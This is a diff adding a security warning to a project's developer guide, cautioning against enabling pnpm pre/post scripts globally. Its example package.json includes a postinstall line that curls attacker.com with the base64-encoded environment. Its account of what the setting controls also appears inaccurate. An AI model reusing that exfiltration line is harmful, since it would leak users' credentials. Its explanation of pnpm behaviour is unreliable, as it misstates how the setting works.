@@ -369,6 +369,93 @@ When adding a new feature, follow this process:
 
 This section documents recurring mistakes and anti-patterns to avoid during development.
 
+### 🔐 Security: NEVER Enable Scripts Globally
+
+**CRITICAL SECURITY WARNING:**
+
+**❌ NEVER DO THIS:**
+```bash
+# In amplify.yml or anywhere
+pnpm config set enable-pre-post-scripts true
+```
+
+**Why This is Dangerous:**
+
+This command attempts to enable npm/pnpm install scripts **globally** (across all projects on your system). This creates a massive security vulnerability.
+
+**Real Attack Scenario:**
+
+```json
+// Malicious package.json from untrusted repo
+{
+  "name": "innocent-looking-package",
+  "scripts": {
+    "postinstall": "curl https://attacker.com/steal?data=$(env | base64)"
+  }
+}
+```
+
+**What Happens:**
+
+1. You clone a random GitHub repo or install an npm package
+2. You run `pnpm install`
+3. **With global scripts enabled:** The `postinstall` script runs automatically
+4. **Result:** Attacker receives:
+   - Your `AWS_ACCESS_KEY_ID` and `AWS_SECRET_ACCESS_KEY`
+   - Your `DATABASE_URL` with credentials
+   - Your `API_SECRET_KEY` and other tokens
+   - All environment variables from your system
+
+**Real-World Impact:**
+- ✅ Attacker accesses your AWS account → Runs up $50,000 bill
+- ✅ Attacker steals customer data from your database
+- ✅ Attacker pushes malicious code to your GitHub repos
+- ✅ Cryptominers installed → Computer slows down, high electricity bills
+
+**Why pnpm Blocks This:**
+
+```
+[ERR_PNPM_CONFIG_SET_UNSUPPORTED_YAML_CONFIG_KEY]
+The key "enable-pre-post-scripts" isn't supported by the global config.yaml file
+```
+
+pnpm **intentionally prevents** this command to protect you from accidentally enabling dangerous behavior across all projects.
+
+**✅ Safe Alternative:**
+
+Modern pnpm (v10+) **already enables scripts by default** for packages in your `package.json`. You don't need to enable anything!
+
+```yaml
+# amplify.yml - Correct and Safe
+preBuild:
+  commands:
+    - npm install -g pnpm
+    - pnpm install  # Scripts run for YOUR packages only
+```
+
+**If You Really Need Project-Level Control:**
+
+Create a `.npmrc` file **in your project root** (not global):
+
+```ini
+# .npmrc (project-level only)
+enable-pre-post-scripts=true
+```
+
+This way, scripts only run in projects where you explicitly opt-in, not everywhere.
+
+**Remember:**
+- 🔒 Global script enablement = Security nightmare
+- ✅ Project-level control = Safe and intentional
+- 🛡️ pnpm protects you by blocking global enablement
+
+**References:**
+- [Real attack: event-stream package](https://blog.npmjs.org/post/180565383195/details-about-the-event-stream-incident) - $200K stolen
+- [Real attack: ua-parser-js](https://github.com/faisalman/ua-parser-js/issues/536) - 8M weekly downloads compromised
+- [pnpm security: why scripts are restricted](https://pnpm.io/npmrc#enable-pre-post-scripts)
+
+---
+
 ### Next.js 16 App Router
 
 **Wrong Router Import:**
